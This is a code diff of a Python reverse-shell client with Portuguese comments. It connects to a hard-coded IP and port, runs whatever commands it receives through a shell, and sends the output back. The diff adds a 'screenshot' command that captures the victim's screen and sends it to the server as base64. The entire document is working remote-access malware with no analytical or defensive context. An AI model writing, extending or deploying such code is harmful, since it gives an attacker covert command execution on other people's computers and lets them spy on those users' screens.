@@ -1,27 +1,35 @@
 import socket
-import os
 import subprocess
+import base64
+from io import BytesIO
+from PIL import ImageGrab
+
+def capturar_tela():
+    screenshot = ImageGrab.grab()
+    buffer = BytesIO()
+    screenshot.save(buffer, format="PNG")  # Salva no buffer como PNG
+    return base64.b64encode(buffer.getvalue()).decode()  # Converte para base64
 
 client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 client_socket.connect(('10.137.73.36', 6783))  # Conectando ao servidor
 
 while True:
-    resposta = client_socket.recv(1024).decode()
-    try:
-        # Executa o comando e captura a saída
-        processo = subprocess.Popen(resposta, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
-        saida, erro = processo.communicate()
-        
-        # Envia a saída ou erro de volta ao servidor
-        if saida:
-            client_socket.sendall(saida.encode())
-        elif erro:
-            client_socket.sendall(erro.encode())
-        else:
-            client_socket.sendall("Comando executado sem saída.".encode())
+    comando = client_socket.recv(1024).decode()
     
-    except Exception as e:
-        client_socket.sendall(f"Erro ao executar o comando: {str(e)}".encode())
-
+    if not comando:
+        break  # Se o servidor fechar a conexão
+    
+    if comando.lower() == "screenshot":
+        imagem_base64 = capturar_tela()
+        client_socket.sendall(imagem_base64.encode())  # Envia a string base64 da imagem
+    
+    else:
+        try:
+            processo = subprocess.Popen(comando, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+            saida, erro = processo.communicate()
+            resposta = saida if saida else erro
+            client_socket.sendall(resposta.encode())
+        except Exception as e:
+            client_socket.sendall(f"Erro ao executar comando: {str(e)}".encode())
 
 client_socket.close()
